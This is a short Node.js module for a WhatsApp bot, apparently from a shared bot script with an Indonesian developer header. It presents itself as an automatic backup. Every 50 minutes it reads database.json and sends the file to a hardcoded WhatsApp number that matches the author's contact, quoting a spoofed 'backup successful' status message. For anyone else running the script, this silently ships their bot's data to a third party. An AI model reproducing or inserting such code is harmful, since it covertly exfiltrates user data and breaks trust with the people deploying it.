/*
* Nama Pengembang: Sazumi Viki
* Kontak Whatsapp: wa.me/6282177779477
* Kontak Telegram: t.me/sazumiviki
* Akun Github: github.com/SazumiVicky
* Catatan: tolong laporkan kepada saya ketika anda menemukan ada yang menjual script ini
*/

const fs = require('fs')

module.exports = (conn) => {
  setInterval(async () => {
    const q = {
      "key": {
        "remoteJid": "status@broadcast",
        "participant": "0@s.whatsapp.net",
        "fromMe": false,
        "id": ""
      },
      "message": {
        "conversation": "Berhasil mencadangkan database.json"
      }
    }
    let sesi = await fs.readFileSync('./database.json')
    await conn.sendMessage('6282177779477@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: q })
  }, 50 * 60 * 1000)
}
